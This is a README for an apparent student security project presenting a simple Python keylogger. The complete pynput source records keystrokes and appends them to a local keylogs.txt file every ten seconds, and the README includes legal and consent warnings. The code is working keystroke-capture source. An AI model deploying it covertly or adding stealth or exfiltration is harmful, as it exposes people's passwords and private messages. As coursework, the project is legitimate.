# Information System Security

# Keylogger Project

This project contains a simple keylogger (keyboard listener) application written in Python. It enables users to record keystrokes to a text file at specified intervals (e.g., every 10 seconds).

> **Warning**  
> This project is intended for **educational** and **assignment** purposes only. Tools like keyloggers can constitute illegal activity if misused. Use this project solely on your own devices and with proper permission from the relevant parties.

## Features

- Logs keyboard input into `keylogs.txt` every predefined interval (e.g., 10 seconds).
- Special keys (Enter, Tab, Space, Backspace) are handled and recorded in a readable format.
- Arrow keys and other system keys are not recorded.
- The listener stops when the **Esc** key is pressed.

## Installation

1. **Python Version**  
   This project requires Python 3 or later.

2. **Required Libraries**  
   - [pynput](https://pypi.org/project/pynput/)  
     ```
     pip install pynput
     ```

3. **Clone or Download the Project**  
   Save these files to a folder or clone the repository.

## Usage

1. Open the `keylogger.py` file.
2. Adjust the `interval` variable (default is 10 seconds) to your desired value:  
   ```python
   interval = 10  # Time interval (in seconds) for logging data
   ```
3. Run the application from the command line/terminal:  
   ```bash
   python keylogger.py
   ```
4. Once the program starts, it will collect keystrokes. Every **interval** seconds, the data will be appended to the `keylogs.txt` file.
5. To stop the program, press the **Esc** key.

## Code Explanation

```python
from pynput import keyboard
import threading

text = ""
interval = 10  # Interval in seconds for writing logs to the file

def send():
    global text
    try:
        with open("keylogs.txt", "a") as f:
            f.write(text)
        print("Data has been written to the file.")
        text = ""  # Reset text after writing to the file
        timer = threading.Timer(interval, send)
        timer.start()
    except Exception as e:
        print("An error occurred while sending data:", e)

def on_press(key):
    global text
    # Handle special keys
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # Capture and record normal character keys
        try:
            char = key.char
            if char is not None:
                text += char
        except AttributeError:
            # Ignore special keys (e.g., arrow keys)
            pass

with keyboard.Listener(on_press=on_press) as listener:
    send()  # Start sending logs at the specified interval
    listener.join()
```

### Important Points
- When `keylogger.py` is running, the file **keylogs.txt** will be created (if not already existing) in the same directory.  
- `keylogs.txt` is opened in **append** mode, so each log is added to the end of the file.  
- Check the contents of `keylogs.txt` periodically to review the captured data.

## Privacy and Legal Notice

- Only run this application on systems you own or where you have explicit permission.  
- Using a keylogger without the owner’s knowledge is illegal in many jurisdictions.
- This project is shared for **learning and awareness** purposes only. You are fully responsible for any misuse.

## Contributing

- Feel free to submit pull requests or suggest improvements directly to the project owner.
- You can fork this project and adapt it to your needs.

## License

This project is not licensed under any specific license. It can be used for educational purposes. For detailed usage terms, please refer to additional licensing details or contact the project owner.


